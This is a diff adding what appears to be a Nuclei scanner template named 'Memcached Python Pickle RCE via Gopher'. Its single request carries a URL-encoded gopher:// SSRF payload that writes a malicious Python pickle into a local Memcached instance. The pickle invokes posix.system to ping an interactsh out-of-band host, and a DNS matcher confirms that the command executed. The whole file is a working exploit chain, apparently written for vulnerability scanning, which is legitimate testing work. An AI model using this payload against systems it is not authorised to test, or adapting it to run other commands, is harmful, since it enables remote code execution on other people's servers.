@@ -1,0 +1,18 @@
+id: gopher-memcached-python-rce
+info:
+  name: Memcached Python Pickle RCE via Gopher
+  author: jakelo-ai
+  severity: critical
+  description: Exploit SSRF to inject malicious Python Pickle object into Memcached, triggering interactsh DNS lookup.
+  tags: ssrf,gopher,memcached,python,rce,oast,custom
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%201%2060%20111%0d%0acposix%0Asystem%0Ap1%0A%28S%27ping%20-c%201%20{{interactsh-url}}%27%0Ap2%0AtRp3%0A.%0d%0a"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
